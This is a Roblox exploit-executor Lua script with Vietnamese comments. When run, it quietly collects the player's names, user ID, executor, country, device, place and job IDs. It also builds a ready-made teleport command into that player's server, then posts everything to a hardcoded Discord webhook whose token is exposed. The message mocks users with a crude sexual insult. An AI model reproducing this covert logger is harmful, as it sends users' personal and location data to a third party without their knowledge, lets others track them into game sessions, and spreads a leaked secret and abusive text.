local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local username = LocalPlayer.Name
local displayName = LocalPlayer.DisplayName
local userId = LocalPlayer.UserId
local placeId = game.PlaceId
local jobId = game.JobId

-- Link hồ sơ và game
local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
local gameLink = "https://www.roblox.com/games/" .. placeId

-- Executor
local executor = "Unknown"
if syn then
    executor = "Synapse X"
elseif KRNL_LOADED then
    executor = "Krnl"
elseif fluxus then
    executor = "Fluxus"
elseif getexecutorname then
    local success, name = pcall(getexecutorname)
    if success then executor = name end
end

-- Quốc gia
local locale = LocalPlayer.LocaleId:lower()
local country = "Không xác định"
if string.find(locale, "vn") then
    country = "🇻🇳 Việt Nam"
elseif string.find(locale, "us") then
    country = "🇺🇸 Hoa Kỳ"
elseif string.find(locale, "ph") then
    country = "🇵🇭 Philippines"
elseif string.find(locale, "id") then
    country = "🇮🇩 Indonesia"
elseif string.find(locale, "th") then
    country = "🇹🇭 Thái Lan"
elseif string.find(locale, "kr") then
    country = "🇰🇷 Hàn Quốc"
elseif string.find(locale, "jp") then
    country = "🇯🇵 Nhật Bản"
elseif string.find(locale, "br") then
    country = "🇧🇷 Brazil"
elseif string.find(locale, "de") then
    country = "🇩🇪 Đức"
elseif string.find(locale, "fr") then
    country = "🇫🇷 Pháp"
elseif string.find(locale, "ru") then
    country = "🇷🇺 Nga"
end

-- Thiết bị
local deviceType = "PC"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
end

-- Mã Teleport
local teleportCode = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)', placeId, jobId)

-- Webhook URL
local webhook = "https://discord.com/api/webhooks/1369006034097668229/2zkaOJMXOOKjj_zF3YLv0YLJRNuMfCpAn8d1gXw-WyC8L9qDvnY-XSSq_tIu14fN-iIk"

-- Tạo payload gửi đi
local data = {
    ["username"] = "NomDom Notifer shows player",
    ["embeds"] = {{
        ["title"] = "+1 máy đang sài script của tao",
        ["color"] = tonumber(0xFFFF00),  -- Thay đổi màu viền thành vàng
        ["fields"] = {
            {["name"] = "Tên hiển thị:", ["value"] = "[" .. displayName .. "](" .. profileLink .. ")", ["inline"] = false},
            {["name"] = "Tên người dùng:", ["value"] = "[" .. username .. "](" .. profileLink .. ")", ["inline"] = true},
            {["name"] = "User ID:", ["value"] = tostring(userId), ["inline"] = true},
            {["name"] = "Executor:", ["value"] = executor, ["inline"] = true},
            {["name"] = "Quốc gia:", ["value"] = country, ["inline"] = true},
            {["name"] = "Thiết bị:", ["value"] = deviceType, ["inline"] = true},
            {["name"] = "Place ID:", ["value"] = tostring(placeId), ["inline"] = true},
            {["name"] = "Job ID:", ["value"] = jobId, ["inline"] = false},
            {["name"] = "Script Hop:", ["value"] = "```lua\n" .. teleportCode .. "\n```", ["inline"] = false},
            {["name"] = "Cảm ơn chúng mày đã dùng script của tao", ["value"] = "Mẹ mày rất múp", ["inline"] = false}
        }
    }}
}

-- Gửi request
pcall(function()
    local success, message = pcall(function()
        local request = (syn and syn.request or request) or HttpService
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)

    if not success then
        warn("Error sending webhook: " .. message)
    end
end)
